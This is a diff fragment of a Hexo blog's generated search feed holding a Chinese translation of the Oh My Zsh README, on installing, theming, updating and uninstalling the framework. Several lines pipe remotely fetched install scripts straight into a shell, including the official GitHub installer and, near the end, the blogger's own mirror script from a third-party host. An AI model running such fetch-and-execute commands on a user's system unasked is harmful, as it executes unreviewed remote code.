+<p>找到要使用的主题后，您需要编辑该文件。您将在那里看到一个环境变量（全部大写），如下所示：<code>~/.zshrc</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure>
+
+<p>要使用其他主题，只需更改值以匹配所需主题的名称即可。例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot; # (this is one of the fancy ones)</span><br><span class="line"><span class="meta"># </span><span class="language-bash">see https://github.com/ohmyzsh/ohmyzsh/wiki/Themes<span class="comment">#agnoster</span></span></span><br></pre></td></tr></table></figure>
+
+<p><em>注意：许多主题需要安装  <a href="https://github.com/powerline/fonts">Powerline 字体</a> 或  <a href="https://github.com/ryanoasis/nerd-fonts">书字体</a> 才能正确呈现。没有它们，这些主题将呈现<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ#i-have-a-weird-character-in-my-prompt">奇怪的提示符号</a></em></p>
+<p>打开一个新的终端窗口，您的提示应如下所示：</p>
+<p><a href="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png"><img src="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png" alt="“阿格诺斯特”主题"></a></p>
+<p>如果您没有找到适合您需求的主题，请查看wiki以获取<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes">更多主题</a>。</p>
+<p>如果您感到精力充沛，每次打开新的终端窗口时，都可以让计算机为您随机选择一个。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;random&quot; # (...please let it be pie... please be some pie..)</span><br></pre></td></tr></table></figure>
+
+<p>如果您想从自己喜欢的主题列表中选择随机主题：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_CANDIDATES=(</span><br><span class="line">  &quot;robbyrussell&quot;</span><br><span class="line">  &quot;agnoster&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>如果您只知道自己不喜欢哪些主题，则可以将它们添加到忽略的列表中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_IGNORED=(pygmalion tjkirch_mod)</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#faq"></a>常见问题</h3><p>如果您还有其他疑问或问题，可以在我们的<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ">常见问题解答</a>中找到解决方案。</p>
+<h2 id="高级主题"><a href="#高级主题" class="headerlink" title="高级主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-topics"></a>高级主题</h2><p>如果你是那种喜欢亲自动手的人，这些部分可能会引起共鸣。</p>
+<h3 id="高级安装"><a href="#高级安装" class="headerlink" title="高级安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-installation"></a>高级安装</h3><p>某些用户可能希望手动安装 Oh My Zsh，或者更改默认路径或安装程序接受的其他设置（这些设置也记录在安装脚本的顶部）。</p>
+<h4 id="自定义目录"><a href="#自定义目录" class="headerlink" title="自定义目录"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-directory"></a>自定义目录</h4><p>默认位置是（隐藏在您的主目录中，您可以使用<code>~/.oh-my-zsh``cd ~/.oh-my-zsh</code>)</p>
+<p>如果要使用环境变量更改安装目录，请在安装之前运行，或在安装管道结束之前对其进行设置，如下所示：<code>ZSH``export ZSH=/your/path</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH=&quot;$HOME/.dotfiles/oh-my-zsh&quot; sh install.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="无人参与安装"><a href="#无人参与安装" class="headerlink" title="无人参与安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#unattended-install"></a>无人参与安装</h4><p>如果您在自动安装过程中运行 Oh My Zsh 安装脚本，则可以将标志传递给该脚本。这将具有不尝试更改默认 shell 的效果，并且在安装完成后它也不会运行。<code>--unattended``install.sh``zsh</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; &quot;&quot; --unattended</span><br></pre></td></tr></table></figure>
+
+<h4 id="从分叉存储库安装"><a href="#从分叉存储库安装" class="headerlink" title="从分叉存储库安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installing-from-a-forked-repository"></a>从分叉存储库安装</h4><p>安装脚本还接受以下变量以允许安装不同的存储库：</p>
+<ul>
+<li><p><code>REPO</code>（默认值：）：其形式为 .如果设置此变量，安装程序将在 中查找存储库。<code>ohmyzsh/ohmyzsh``owner/repository``https://github.com/&#123;owner&#125;/&#123;repository&#125;</code></p>
+</li>
+<li><p><code>REMOTE</code>（默认值：）：这是 git 存储库克隆的完整 URL。如果要从不在 GitHub 上的分叉（GitLab、Bitbucket…）进行安装，或者要使用 SSH 而不是 HTTPS 进行克隆（），则可以使用此设置。<code>https://github.com/$&#123;REPO&#125;.git``git@github.com:user/project.git</code></p>
+<p>  <em>注意：它与设置  <code>REPO</code>  变量不兼容。此设置将优先。</em></p>
+</li>
+<li><p><code>BRANCH</code>（默认值：）：如果要在克隆存储库时更改要签出的默认分支，则可以使用此设置。这对于测试拉取请求或要使用 以外的分支可能很有用。<code>master``master</code></p>
+</li>
+</ul>
+<p>例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">REPO=apjanke/oh-my-zsh BRANCH=edge sh install.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-installation"></a>手动安装</h4><h5 id="1-克隆存储库"><a href="#1-克隆存储库" class="headerlink" title="1. 克隆存储库"></a><a href="https://github.com/ohmyzsh/ohmyzsh#1-clone-the-repository-"></a>1. 克隆存储库</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-可选，备份现有文件-zshrc"><a href="#2-可选，备份现有文件-zshrc" class="headerlink" title="2.可选，备份现有文件~/.zshrc"></a><a href="https://github.com/ohmyzsh/ohmyzsh#2-optionally-backup-your-existing-zshrc-file-"></a>2.<em>可选，</em>备份现有文件<code>~/.zshrc</code></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-创建新的-zsh-配置文件"><a href="#3-创建新的-zsh-配置文件" class="headerlink" title="3. 创建新的 zsh 配置文件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#3-create-a-new-zsh-configuration-file-"></a>3. 创建新的 zsh 配置文件</h5><p>您可以通过复制我们为您包含的模板来创建新的 zsh 配置文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-更改默认外壳"><a href="#4-更改默认外壳" class="headerlink" title="4. 更改默认外壳"></a><a href="https://github.com/ohmyzsh/ohmyzsh#4-change-your-default-shell-"></a>4. 更改默认外壳</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s $(which zsh)</span><br></pre></td></tr></table></figure>
+
+<p>您必须从用户会话注销并重新登录才能看到此更改。</p>
+<h5 id="5-初始化新的-zsh-配置"><a href="#5-初始化新的-zsh-配置" class="headerlink" title="5. 初始化新的 zsh 配置"></a><a href="https://github.com/ohmyzsh/ohmyzsh#5-initialize-your-new-zsh-configuration-"></a>5. 初始化新的 zsh 配置</h5><p>打开新的终端窗口后，它应该使用Oh My Zsh的配置加载zsh。</p>
+<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installation-problems"></a>安装问题</h3><p>如果您安装任何打嗝，以下是一些常见的修复程序。</p>
+<ul>
+<li>如果在切换到 后无法找到某些命令，则<em>可能需要</em>修改 in。<code>PATH``~/.zshrc``oh-my-zsh</code></li>
+<li>如果手动安装或更改了安装位置，请检查 中的环境变量。<code>ZSH``~/.zshrc</code></li>
+</ul>
+<h3 id="自定义插件和主题"><a href="#自定义插件和主题" class="headerlink" title="自定义插件和主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-plugins-and-themes"></a>自定义插件和主题</h3><p>如果要覆盖任何默认行为，只需在目录中添加一个新文件（以 结尾）。<code>.zsh``custom/</code></p>
+<p>如果您有许多功能可以很好地组合在一起，则可以将它们作为文件放在目录中，然后启用此插件。<code>XYZ.plugin.zsh``custom/plugins/</code></p>
+<p>如果要覆盖使用 Oh My Zsh 分发的插件的功能，请在目录中创建一个同名的插件，该插件将被加载，而不是 .<code>custom/plugins/``plugins/</code></p>
+<h2 id="获取更新"><a href="#获取更新" class="headerlink" title="获取更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-updates"></a>获取更新</h2><p>默认情况下，系统将提示您每 2 周检查一次更新。您可以在<strong>加载Oh My Zsh之前</strong>，通过向文件添加一行来选择其他更新模式：<code>~/.zshrc</code></p>
+<ol>
+<li><p>自动更新，无确认提示：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode auto</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果有可用的更新，只需每隔几天提供一次提醒：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode reminder</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>要完全禁用自动更新：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>注意：您可以使用以下设置控制 Oh My Zsh 检查更新的频率：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every 7 days</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every time you open the terminal (not recommended)</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-updates"></a>手动更新</h3><p>如果你想在任何时间点更新（也许有人刚刚发布了一个新插件，你不想等一个星期？），你只需要运行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure>
+
+<p>魔法！🎉</p>
+<h2 id="卸载-Oh-My-Zsh"><a href="#卸载-Oh-My-Zsh" class="headerlink" title="卸载 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#uninstalling-oh-my-zsh"></a>卸载 Oh My Zsh</h2><p>哦，我的Zsh并不适合所有人。我们会想念你的，但我们想让这很容易分手。</p>
+<p>如果要卸载 ，只需从命令行运行即可。它将删除自身并还原以前的配置或配置。<code>oh-my-zsh``uninstall_oh_my_zsh``bash``zsh</code></p>
+<h2 id="【推荐】国内脚本配置安装"><a href="#【推荐】国内脚本配置安装" class="headerlink" title="【推荐】国内脚本配置安装"></a>【推荐】国内脚本配置安装</h2><p>考虑到官方方法，需要连接GitHub；如果你的设备无法有效访问GitHub。可以使用我配置的脚本：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -fsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p>为了保证脚本能顺利运行，你的Linux&#x2F;Mac服务器需要：</p>
+<blockquote>
+<p>提前安装curl、unzip,如果有~&#x2F;.zshrc文件，最好提前备份，否则本脚本自动更改原本的.zshrc文件为zshrcBak</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>SHELL</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WIKI - Themes From Oh My Zsh</title>
     <url>/2022/04/28/ohmyzsh-themes/</url>
     <content><![CDATA[<blockquote>
@@ -2245,154 +2393,6 @@
 
 <h2 id="Screenshots-of-each-Theme"><a href="#Screenshots-of-each-Theme" class="headerlink" title="Screenshots of each Theme"></a>Screenshots of each Theme</h2><h3 id="Version-2019-08"><a href="#Version-2019-08" class="headerlink" title="Version 2019-08"></a>Version 2019-08</h3><p>The current set of theme screenshots was generated automatically by <a href="https://github.com/Kovah">@Kovah</a>’s <a href="https://github.com/Kovah/oh-my-zsh-screenshot-generation">Oh My Zsh-screenshot-generation tool</a>, using on macOS Mojave (10.14.5) with the macOS Terminal app. The used theme is <code>Basic</code> with the default settings and colors. The font was switched to <code>Fira Code</code> at 13 pt to enable some special characters in certain themes. All terminal windows have a size of 100x31.</p>
 <h3 id="Version-2013-04"><a href="#Version-2013-04" class="headerlink" title="Version 2013-04"></a>Version 2013-04</h3><p><a href="https://www.dropbox.com/sh/u532agyv1hyash1/LS9yNESRlQ?lst">Screenshot collection</a> (as of 2013-04-10), in OS X Terminal.app using Consolas 13pt and Pro color scheme, inside a folder containing both a git and a mercurial repo. Each screenshot displays the output of the <code>pwd</code> command. It has shortcomings (plugins for some themes might be missing), but it offers a convenient and uniform overview of each theme. Plugins used were battery, rvm, hg prompt, among others.</p>
-]]></content>
-      <categories>
-        <category>SHELL</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>README For Oh My Zsh</title>
-    <url>/2022/04/28/ohmyzsh-readme/</url>
-    <content><![CDATA[<h1 id="关于Oh-My-Zsh"><a href="#关于Oh-My-Zsh" class="headerlink" title="关于Oh My Zsh"></a>关于Oh My Zsh</h1><p>Oh My Zsh是一个开源的，社区驱动的框架，用于管理<a href="https://www.zsh.org/">您的zsh</a>配置。</p>
-<p>听起来很无聊。让我们再试一次。</p>
-<p><strong>哦，我的Zsh不会让你成为10x开发人员…但你可能会觉得自己像一个。</strong></p>
-<p>一旦安装，您的终端外壳将成为镇上的话题<em>或您的钱回来！</em>在命令提示符下每次击键时，您都将利用数百个功能强大的插件和精美的主题。陌生人会在咖啡馆里走到你面前，问你<em>：“这太神奇了！你是某种天才吗？</em></p>
-<p>最后，你将开始得到你一直觉得自己应得的那种关注。…或者，也许您将利用节省的时间更频繁地开始使用牙线。😬</p>
-<p>要了解更多信息，请访问  <a href="https://ohmyz.sh/">ohmyz.sh</a>，在Twitter上关注<a href="https://twitter.com/ohmyzsh">@ohmyzsh</a>，并在<a href="https://discord.gg/ohmyzsh">Discord</a>上加入我们。</p>
-<p><a href="https://github.com/ohmyzsh/ohmyzsh/actions?query=workflow:CI"><img src="https://github.com/ohmyzsh/ohmyzsh/workflows/CI/badge.svg" alt="词"></a>  <a href="https://twitter.com/intent/follow?screen_name=ohmyzsh"><img src="https://camo.githubusercontent.com/11a416635f3d1f03b7a97eac9d92f96b165ffe65a18199d50503e1e5f3c7b633/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6f686d797a73683f6c6162656c3d466f6c6c6f772b406f686d797a7368267374796c653d666c6174" alt="关注@ohmyzsh"></a><a href="https://discord.gg/ohmyzsh"><img src="https://camo.githubusercontent.com/64e8b917c8acd4f1b4c183948adc71b474cd574e5b36882f06c13631ad57ec6f/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f363432343936383636343037323834373436" alt="不和谐服务器"></a><a href="https://gitpod.io/#https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/eed956a921d6c38546e378ad7ee005b423b76361eef47db35b6afb2c71c8a090/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f476974706f642d72656164792d626c75653f6c6f676f3d676974706f64" alt="Gitpod ready"></a><a href="https://huntr.dev/bounties/disclose/?utm_campaign=ohmyzsh/ohmyzsh&utm_medium=social&utm_source=github&target=https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/30c28e8a19d49b9af85a85ca1c2911731b9659e2e8596315faf92162888f162f/68747470733a2f2f63646e2e68756e74722e6465762f68756e74725f73656375726974795f62616467655f6d6f6e6f2e737667" alt="huntr.dev"></a></p>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-started"></a>开始</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#prerequisites"></a>先决条件</h3><ul>
-<li>类Unix操作系统：macOS，Linux，BSD。在Windows上：WSL2是首选，但cygwin或msys也大多工作。</li>
-<li>应该安装<a href="https://www.zsh.org/">Zsh</a>（v4.3.9或更新的版本很好，但我们更喜欢5.0.8及更高版本）。如果未预安装（运行以确认），请在此处查看以下wiki说明：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">安装ZSH</a><code>zsh --version</code></li>
-<li><code>curl</code>或应安装<code>wget</code></li>
-<li><code>git</code>应安装（建议使用 v2.4.11 或更高版本）</li>
-</ul>
-<h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#basic-installation"></a>基本安装</h3><p>Oh My Zsh 是通过在终端中运行以下命令之一来安装的。您可以通过命令行安装它，也可以使用 或其他类似工具。<code>curl``wget</code></p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>curl</strong></td>
-<td><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-<tr>
-<td><strong>wget</strong></td>
-<td><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-<tr>
-<td><strong>fetch</strong></td>
-<td><code>sh -c &quot;$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-</tbody></table>
-<p><em>请注意，任何以前的  <code>.zshrc</code>  都将重命名为  <code>.zshrc.pre-oh-my-zsh</code>。安装后，可以将要保留的配置移动到新的  <code>.zshrc 中</code>。</em></p>
-<h4 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-inspection"></a>手动检查</h4><p>最好从您还不知道的项目中检查安装脚本。为此，您可以先下载安装脚本，浏览它以使一切正常，然后运行它：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="使用-Oh-My-Zsh"><a href="#使用-Oh-My-Zsh" class="headerlink" title="使用 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-oh-my-zsh"></a>使用 Oh My Zsh</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#plugins"></a>插件</h3><p>哦，我的Zsh附带了大量插件供您利用。您可以查看<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">插件</a>目录和&#x2F;或<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">wiki</a>，以查看当前可用的内容。</p>
-<h4 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins"></a>启用插件</h4><p>一旦你发现一个（或几个）你想与Oh My Zsh一起使用的插件，你就需要在文件中启用它们。您将在目录中找到 zshrc 文件。使用您喜欢的文本编辑器打开它，您将看到一个列出要加载的所有插件的位置。<code>.zshrc``$HOME</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>例如，这可能开始看起来像这样：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  bundler</span><br><span class="line">  dotenv</span><br><span class="line">  macos</span><br><span class="line">  rake</span><br><span class="line">  rbenv</span><br><span class="line">  ruby</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p><em>请注意，插件由空格（空格，制表符，新行…）分隔。<strong>不要在</strong>它们之间使用逗号，否则它会中断。</em></p>
-<h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-plugins"></a>使用插件</h4><p>每个内置插件都包含一个<strong>自述文件</strong>，用于记录它。此自述文件应显示别名（如果插件添加了任何别名）以及该特定插件中包含的其他好东西。</p>
-<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#themes"></a>主题</h3><p>我们承认这一点。在Oh My Zsh世界的早期，我们可能有点太快乐了。我们现在捆绑了一百五十多个主题。他们中的大多数在wiki上都有<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">屏幕截图</a>（我们正在努力更新这个！看看他们！</p>
-<h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#selecting-a-theme"></a>选择主题</h4><p><em>Robby的主题是默认主题。这不是最花哨的。这不是最简单的一个。这对他来说是正确的。</em></p>
-<p>找到要使用的主题后，您需要编辑该文件。您将在那里看到一个环境变量（全部大写），如下所示：<code>~/.zshrc</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure>
-
-<p>要使用其他主题，只需更改值以匹配所需主题的名称即可。例如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot; # (this is one of the fancy ones)</span><br><span class="line"><span class="meta"># </span><span class="language-bash">see https://github.com/ohmyzsh/ohmyzsh/wiki/Themes<span class="comment">#agnoster</span></span></span><br></pre></td></tr></table></figure>
-
-<p><em>注意：许多主题需要安装  <a href="https://github.com/powerline/fonts">Powerline 字体</a> 或  <a href="https://github.com/ryanoasis/nerd-fonts">书字体</a> 才能正确呈现。没有它们，这些主题将呈现<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ#i-have-a-weird-character-in-my-prompt">奇怪的提示符号</a></em></p>
-<p>打开一个新的终端窗口，您的提示应如下所示：</p>
-<p><a href="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png"><img src="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png" alt="“阿格诺斯特”主题"></a></p>
-<p>如果您没有找到适合您需求的主题，请查看wiki以获取<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes">更多主题</a>。</p>
-<p>如果您感到精力充沛，每次打开新的终端窗口时，都可以让计算机为您随机选择一个。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;random&quot; # (...please let it be pie... please be some pie..)</span><br></pre></td></tr></table></figure>
-
-<p>如果您想从自己喜欢的主题列表中选择随机主题：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_CANDIDATES=(</span><br><span class="line">  &quot;robbyrussell&quot;</span><br><span class="line">  &quot;agnoster&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>如果您只知道自己不喜欢哪些主题，则可以将它们添加到忽略的列表中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_IGNORED=(pygmalion tjkirch_mod)</span><br></pre></td></tr></table></figure>
-
-<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#faq"></a>常见问题</h3><p>如果您还有其他疑问或问题，可以在我们的<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ">常见问题解答</a>中找到解决方案。</p>
-<h2 id="高级主题"><a href="#高级主题" class="headerlink" title="高级主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-topics"></a>高级主题</h2><p>如果你是那种喜欢亲自动手的人，这些部分可能会引起共鸣。</p>
-<h3 id="高级安装"><a href="#高级安装" class="headerlink" title="高级安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-installation"></a>高级安装</h3><p>某些用户可能希望手动安装 Oh My Zsh，或者更改默认路径或安装程序接受的其他设置（这些设置也记录在安装脚本的顶部）。</p>
-<h4 id="自定义目录"><a href="#自定义目录" class="headerlink" title="自定义目录"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-directory"></a>自定义目录</h4><p>默认位置是（隐藏在您的主目录中，您可以使用<code>~/.oh-my-zsh``cd ~/.oh-my-zsh</code>)</p>
-<p>如果要使用环境变量更改安装目录，请在安装之前运行，或在安装管道结束之前对其进行设置，如下所示：<code>ZSH``export ZSH=/your/path</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH=&quot;$HOME/.dotfiles/oh-my-zsh&quot; sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="无人参与安装"><a href="#无人参与安装" class="headerlink" title="无人参与安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#unattended-install"></a>无人参与安装</h4><p>如果您在自动安装过程中运行 Oh My Zsh 安装脚本，则可以将标志传递给该脚本。这将具有不尝试更改默认 shell 的效果，并且在安装完成后它也不会运行。<code>--unattended``install.sh``zsh</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; &quot;&quot; --unattended</span><br></pre></td></tr></table></figure>
-
-<h4 id="从分叉存储库安装"><a href="#从分叉存储库安装" class="headerlink" title="从分叉存储库安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installing-from-a-forked-repository"></a>从分叉存储库安装</h4><p>安装脚本还接受以下变量以允许安装不同的存储库：</p>
-<ul>
-<li><p><code>REPO</code>（默认值：）：其形式为 .如果设置此变量，安装程序将在 中查找存储库。<code>ohmyzsh/ohmyzsh``owner/repository``https://github.com/&#123;owner&#125;/&#123;repository&#125;</code></p>
-</li>
-<li><p><code>REMOTE</code>（默认值：）：这是 git 存储库克隆的完整 URL。如果要从不在 GitHub 上的分叉（GitLab、Bitbucket…）进行安装，或者要使用 SSH 而不是 HTTPS 进行克隆（），则可以使用此设置。<code>https://github.com/$&#123;REPO&#125;.git``git@github.com:user/project.git</code></p>
-<p>  <em>注意：它与设置  <code>REPO</code>  变量不兼容。此设置将优先。</em></p>
-</li>
-<li><p><code>BRANCH</code>（默认值：）：如果要在克隆存储库时更改要签出的默认分支，则可以使用此设置。这对于测试拉取请求或要使用 以外的分支可能很有用。<code>master``master</code></p>
-</li>
-</ul>
-<p>例如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">REPO=apjanke/oh-my-zsh BRANCH=edge sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-installation"></a>手动安装</h4><h5 id="1-克隆存储库"><a href="#1-克隆存储库" class="headerlink" title="1. 克隆存储库"></a><a href="https://github.com/ohmyzsh/ohmyzsh#1-clone-the-repository-"></a>1. 克隆存储库</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-可选，备份现有文件-zshrc"><a href="#2-可选，备份现有文件-zshrc" class="headerlink" title="2.可选，备份现有文件~/.zshrc"></a><a href="https://github.com/ohmyzsh/ohmyzsh#2-optionally-backup-your-existing-zshrc-file-"></a>2.<em>可选，</em>备份现有文件<code>~/.zshrc</code></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-创建新的-zsh-配置文件"><a href="#3-创建新的-zsh-配置文件" class="headerlink" title="3. 创建新的 zsh 配置文件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#3-create-a-new-zsh-configuration-file-"></a>3. 创建新的 zsh 配置文件</h5><p>您可以通过复制我们为您包含的模板来创建新的 zsh 配置文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<h5 id="4-更改默认外壳"><a href="#4-更改默认外壳" class="headerlink" title="4. 更改默认外壳"></a><a href="https://github.com/ohmyzsh/ohmyzsh#4-change-your-default-shell-"></a>4. 更改默认外壳</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s $(which zsh)</span><br></pre></td></tr></table></figure>
-
-<p>您必须从用户会话注销并重新登录才能看到此更改。</p>
